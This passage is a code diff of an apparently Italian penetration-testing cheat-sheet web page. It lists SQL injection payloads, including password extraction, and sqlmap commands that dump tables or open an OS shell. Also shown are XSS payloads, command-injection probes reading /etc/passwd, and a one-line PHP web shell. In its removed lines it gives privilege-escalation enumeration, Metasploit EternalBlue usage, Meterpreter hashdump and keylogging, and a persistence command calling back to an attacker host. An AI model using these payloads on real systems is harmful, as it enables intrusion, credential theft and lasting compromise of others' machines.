+                    <pre><code># Basic tests
+'
 ' OR '1'='1
+' OR '1'='1' --
+' OR '1'='1' /*
+admin' --
+admin' #</code></pre>
 
-# Union based
+                    <h3>Union-Based SQLi</h3>
+                    <pre><code># Determine number of columns
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+
+# Find vulnerable columns
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
 ' UNION SELECT NULL,NULL,NULL--
 
-# sqlmap
-sqlmap -u "http://target.com/page?id=1" --dbs</code></pre>
+# Extract data
+' UNION SELECT username,password FROM users--
+' UNION SELECT database(),user(),version()--</code></pre>
 
-                    <h3>Cross-Site Scripting (XSS)</h3>
-                    <pre><code># Reflected XSS
-<script>alert('XSS')</script>
+                    <h3>SQLMap</h3>
+                    <pre><code># Basic usage
+sqlmap -u "http://target.com/page?id=1"
 
-# DOM-based
+# With POST data
+sqlmap -u "http://target.com/login" --data "user=admin&pass=test"
+
+# List databases
+sqlmap -u "http://target.com/page?id=1" --dbs
+
+# List tables
+sqlmap -u "http://target.com/page?id=1" -D database --tables
+
+# Dump table
+sqlmap -u "http://target.com/page?id=1" -D database -T users --dump
+
+# OS shell
+sqlmap -u "http://target.com/page?id=1" --os-shell</code></pre>
+
+                    <h2>Cross-Site Scripting (XSS)</h2>
+                    <h3>Reflected XSS</h3>
+                    <pre><code><script>alert('XSS')</script>
 <img src=x onerror=alert('XSS')>
-
-# Stored XSS
-<svg onload=alert('XSS')></code></pre>
-
-                    <h3>Command Injection</h3>
-                    <pre><code># Basic test
-; ls
-| whoami
-` cat /etc/passwd `</code></pre>
-
-                    <h2>File Upload Vulnerabilities</h2>
-                    <ul>
-                        <li>Bypass extension filtering</li>
-                        <li>Upload web shells</li>
-                        <li>Magic bytes manipulation</li>
-                    </ul>
-
-                    <h3>PHP Web Shell</h3>
-                    <pre><code><?php system($_GET['cmd']); ?></code></pre>
-                `
-            },
-            'exploit-priv': {
-                title: 'Privilege Escalation',
-                meta: 'Tecniche per l\'escalation dei privilegi su sistemi compromessi',
-                content: `
-                    <h2>Linux Privilege Escalation</h2>
-
-                    <h3>Enumeration</h3>
-                    <pre><code># System info
-uname -a
-cat /etc/issue
-
-# User info
-id
-sudo -l
-
-# SUID binaries
-find / -perm -4000 2>/dev/null
-
-# Writable files
-find / -writable -type f 2>/dev/null</code></pre>
-
-                    <h3>Common Techniques</h3>
-                    <ul>
-                        <li><strong>SUID binaries</strong> - Sfruttamento di binari con bit SUID</li>
-                        <li><strong>Sudo misconfiguration</strong> - Comandi eseguibili come root</li>
-                        <li><strong>Kernel exploits</strong> - Exploit per vulnerabilità del kernel</li>
-                        <li><strong>Cron jobs</strong> - Script eseguiti come root</li>
-                    </ul>
-
-                    <h2>Windows Privilege Escalation</h2>
-
-                    <h3>Enumeration</h3>
-                    <pre><code># System info
-systeminfo
-whoami /priv
-
-# Services
-sc query
-
-# Scheduled tasks
-schtasks /query /fo LIST /v</code></pre>
-
-                    <h3>Tools</h3>
-                    <ul>
-                        <li><strong>WinPEAS</strong> - Automated enumeration</li>
-                        <li><strong>PowerUp</strong> - PowerShell privilege escalation</li>
-                        <li><strong>Mimikatz</strong> - Credential dumping</li>
-                    </ul>
-                `
-            },
-            'tools-metasploit': {
-                title: 'Metasploit Framework',
-                meta: 'Guida all\'uso del Metasploit Framework',
-                content: `
-                    <h2>Introduzione a Metasploit</h2>
-                    <p>Metasploit è il framework di exploitation più utilizzato nel pentesting.</p>
-
-                    <h2>Comandi Base</h2>
-                    <pre><code># Avvio msfconsole
-msfconsole
-
-# Ricerca exploit
-search type:exploit platform:windows
-
-# Utilizzo exploit
-use exploit/windows/smb/ms17_010_eternalblue
-show options
-set RHOSTS target_ip
-set LHOST attacker_ip
-exploit</code></pre>
-
-                    <h2>Meterpreter</h2>
-                    <pre><code># Comandi Meterpreter
-sysinfo
-getuid
-ps
-migrate <PID>
-hashdump
-screenshot
-keyscan_start
-keyscan_dump</code></pre>
-
-                    <h2>Post-Exploitation</h2>
-                    <pre><code># Persistence
-run persistence -X -i 10 -p 4444 -r attacker_ip
-
-# Privilege escalation
-getsystem
-
-# Pivoting
-route add subnet netmask session_id</code></pre>
-                `
-            },
-            'tools-burp': {
-                title: 'Burp Suite',
-                meta: 'Guida all\'uso di Burp Suite per web app testing',
-                content: `
-                    <h2>Introduzione a Burp Suite</h2>
-                    <p>Burp Suite è lo strumento standard per il testing di applicazioni web.</p>
-
-                    <h2>Configurazione</h2>
-                    <ul>
-                        <li>Configurare il browser per usare il proxy (127.0.0.1:8080)</li>
-                        <li>Importare il certificato CA di Burp nel browser</li>
-                        <li>Abilitare l'intercettazione in Proxy → Intercept</li>
-                    </ul>
-
-                    <h2>Funzionalità Principali</h2>
-
-                    <h3>Proxy</h3>
-                    <p>Intercettazione e modifica delle richieste HTTP/HTTPS in tempo reale.</p>
-
-                    <h3>Repeater</h3>
-                    <p>Invio manuale di richieste modificate per test specifici.</p>
-
-                    <h3>Intruder</h3>
-                    <p>Automated attacks: brute force, fuzzing, parameter manipulation.</p>
-
-                    <h3>Scanner (Pro)</h3>
-                    <p>Scansione automatica per vulnerabilità comuni.</p>
-
-                    <h2>Tecniche Utili</h2>
-                    <ul>
-                        <li>Match and Replace per modifiche automatiche</li>
-                        <li>Session handling per gestire autenticazione</li>
-                        <li>Scope definition per limitare il testing</li>
-                        <li>Extensions per funzionalità aggiuntive</li>
-                    </ul>
-                `
-            }
-        };
-
-        // FUNZIONE PER CARICARE UNA PAGINA
-        function loadPage(pageId) {
-            const page = pages[pageId];
-            if (!page) return;
-
-            const contentDiv = document.getElementById('pageContent');
-            contentDiv.innerHTML = `
-                <h1 class="page-title">${page.title}</h1>
-                <div class="page-meta">${page.meta}</div>
-                <div class="content">
-                    ${page.content}
-                </div>
-            `;
-
-            // Update active nav item
-            document.querySelectorAll('.nav-item').forEach(item => {
-                item.classList.remove('active');
-                if (item.dataset.page === pageId) {
-                    item.classList.add('active');
-                }
-            });
-
-            // Scroll to top
-            document.querySelector('.content-area').scrollTop = 0;
-        }
-
-        // EVENT LISTENERS
-        document.querySelectorAll('.nav-item').forEach(item => {
-            item.addEventListener('click', () => {
-                loadPage(item.dataset.page);
-            });
-        });
-
-        // SEARCH FUNCTIONALITY
-        const searchInput = document.getElementById('searchInput');
-        searchInput.addEventListener('input', (e) => {
-            const query = e.target.value.toLowerCase();
-            
-            document.querySelectorAll('.nav-item').forEach(item => {
-                const text = item.textContent.toLowerCase();
-                if (text.includes(query)) {
-                    item.style.display = 'flex';
-                } else {
-                    item.style.display = query ? 'none' : 'flex';
-                }
-            });
-        });
-
-        // LOAD HOME PAGE ON START
-        loadPage('home');
-    </script>
-</body>
-</html>
+<svg onload=alert('XSS')>
+<body onload=alert('XSS')>
+<iframe src="javascript:alert('XSS')">
